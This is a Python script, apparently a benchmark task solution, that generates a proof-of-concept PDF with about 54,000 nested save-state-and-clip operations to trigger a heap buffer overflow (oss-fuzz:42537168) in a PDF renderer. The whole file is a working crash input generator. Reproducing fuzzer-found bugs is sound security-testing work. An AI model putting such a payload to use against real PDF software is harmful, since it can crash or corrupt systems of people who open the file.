import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability (oss-fuzz:42537168).
        The vulnerability is caused by unchecked nesting depth before pushing a clip mark.
        We generate a PDF with deeply nested clipping operations to overflow the stack/buffer.
        """
        # The ground truth PoC is approximately 914KB.
        # We construct a PDF stream that repeats a sequence of saving state and clipping.
        # Sequence: "q 0 0 1 1 re W n "
        # q: Save graphics state
        # 0 0 1 1 re: Define a rectangle path
        # W: Intersect with current clipping path (triggers the clip mark push)
        # n: End path
        
        # Each repetition is 17 bytes.
        # 914000 / 17 is approximately 53,764.
        # We use 54,000 iterations to ensure we exceed typical internal limits (e.g., 32k or 64k).
        iterations = 54000
        
        # Build the payload stream
        # Repeating the clip operation deeply nests the clipping stack.
        payload = b"q 0 0 1 1 re W n " * iterations
        
        # Construct a minimal PDF file structure
        pdf_header = b"%PDF-1.4"
        
        # Object 1: Catalog
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj"
        
        # Object 2: Pages
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj"
        
        # Object 3: Page
        # MediaBox defines the page size. Contents references the stream object (4 0 R).
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>\nendobj"
        
        # Object 4: Content Stream
        # The stream contains the malicious payload.
        stream_len = len(payload)
        obj4_header = f"4 0 obj\n<< /Length {stream_len} >>\nstream".encode('ascii')
        obj4_footer = b"endstream\nendobj"
        
        # Trailer
        # A minimal trailer is usually sufficient for fuzzing targets.
        trailer = b"trailer\n<< /Root 1 0 R >>\n%%EOF"
        
        # Assemble the PDF parts
        # We use newline as a separator.
        parts = [
            pdf_header,
            obj1,
            obj2,
            obj3,
            obj4_header,
            payload,
            obj4_footer,
            trailer
        ]
        
        return b"\n".join(parts)